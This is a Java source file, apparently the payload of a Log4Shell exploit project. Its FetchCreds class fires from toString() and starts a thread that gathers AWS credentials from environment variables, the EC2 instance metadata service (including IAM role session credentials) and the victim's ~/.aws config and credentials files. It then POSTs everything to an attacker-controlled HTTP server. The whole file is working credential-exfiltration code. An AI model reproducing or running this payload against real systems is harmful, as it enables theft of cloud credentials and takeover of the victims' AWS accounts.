package log4shell.aws;

import log4shell.HttpClient;
import log4shell.Json;
import log4shell.WithHttpServerUri;

import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Collections;
import java.util.Map;
import java.util.function.Consumer;

public class FetchCreds implements Serializable, WithHttpServerUri, Runnable {
  private static final String IMDS_URI = "http://169.254.169.254";
  private static final String IMDS_TOKEN_ENDPOINT = "/latest/api/token";
  private static final String IMDS_CREDENTIAL_ENDPOINT =
      "/latest/meta-data/iam/security-credentials/";

  private static final String TOKEN_TTL_SECONDS_HEADER = "X-aws-ec2-metadata-token-ttl-seconds";
  private static final String TOKEN_HEADER = "X-aws-ec2-metadata-token";

  public static final String SIX_HOURS = "21600";

  private URI httpServerUri;

  @Override
  public void setHttpServerUri(URI httpServerUri) {
    this.httpServerUri = httpServerUri;
  }

  @Override
  public String toString() {
    System.out.println("FetchCreds");
    new Thread(this).start();
    return "";
  }

  @Override
  public void run() {
    System.out.println("start run");
    Creds creds = new Creds();

    readEnv("AWS_PROFILE", null, creds::setProfile);
    readEnv("AWS_ACCESS_KEY_ID", "aws.accessKeyId", creds::setAccessKeyId);
    readEnv("AWS_SECRET_ACCESS_KEY", "aws.secretKey", creds::setSecretAccessKey);
    readEnv("AWS_SESSION_TOKEN", "aws.sessionToken", creds::setSessionToken);
    readEnv("AWS_ROLE_ARN", null, creds::setRoleArn);
    readEnv("AWS_REGION", null, creds::setRegion);
    readEnv("AWS_WEB_IDENTITY_TOKEN_FILE", null, creds::setWebIdentityTokenFile);

    System.err.println("call instanceCredentials");
    instanceCredentials(creds);

    String home = System.getProperty("user.home");
    if (home != null && !home.isEmpty()) {
      Path awsPath = Paths.get(home).resolve(".aws");
      loadFile(awsPath, "config", creds::setConfigFile);
      loadFile(awsPath, "credentials", creds::setCredentialsFile);
    }

    HttpClient.post(httpServerUri, LogCreds.class, creds);
  }

  private void instanceCredentials(Creds creds) {
    System.err.println("start instanceCredentials");
    String token =
        readImdsResource(
            "PUT",
            IMDS_TOKEN_ENDPOINT,
            Collections.singletonMap(TOKEN_TTL_SECONDS_HEADER, SIX_HOURS));
    if (token == null || token.isEmpty()) return;
    System.err.println("token " + token);
    Map<String, String> tokenHeaders = Collections.singletonMap(TOKEN_HEADER, token);
    String iamRole = readImdsResource(IMDS_CREDENTIAL_ENDPOINT, tokenHeaders);
    if (iamRole == null) return;
    iamRole = iamRole.trim();
    if (iamRole.isEmpty()) return;
    System.err.println("role " + iamRole);
    String json = readImdsResource(IMDS_CREDENTIAL_ENDPOINT + '/' + iamRole, tokenHeaders);
    if (json == null || json.isEmpty()) return;
    try {
      InstanceSession instanceSession = Json.mapper.readValue(json, InstanceSession.class);
      creds.setInstanceSession(instanceSession);
    } catch (IOException ignored) {
      ignored.printStackTrace();
    }
  }

  private String readImdsResource(String path, Map<String, String> headers) {
    return readImdsResource("GET", path, headers);
  }

  private String readImdsResource(String method, String path, Map<String, String> headers) {
    try {
      URL tokenEndpoint = new URL(IMDS_URI + path);
      HttpURLConnection conn = (HttpURLConnection) tokenEndpoint.openConnection(Proxy.NO_PROXY);
      conn.setRequestMethod(method);
      headers.forEach(conn::setRequestProperty);
      int len = conn.getContentLength();
      try (InputStream in = conn.getInputStream()) {
        return HttpClient.readAll(in, len, StandardCharsets.UTF_8);
      }
    } catch (Exception ignored) {
      ignored.printStackTrace();
      return null;
    }
  }

  private void readEnv(String env, String property, Consumer<String> setter) {
    String value = System.getenv(env);
    if (value == null && property != null) {
      value = System.getProperty(property);
    }
    if (value != null) {
      setter.accept(value);
    }
  }

  private void loadFile(Path parent, String name, Consumer<String> setter) {
    Path file = parent.resolve(name);
    if (Files.exists(file)) {
      try {
        byte[] content = Files.readAllBytes(file);
        setter.accept(new String(content, StandardCharsets.UTF_8));
      } catch (IOException ignored) {
      }
    }
  }
}
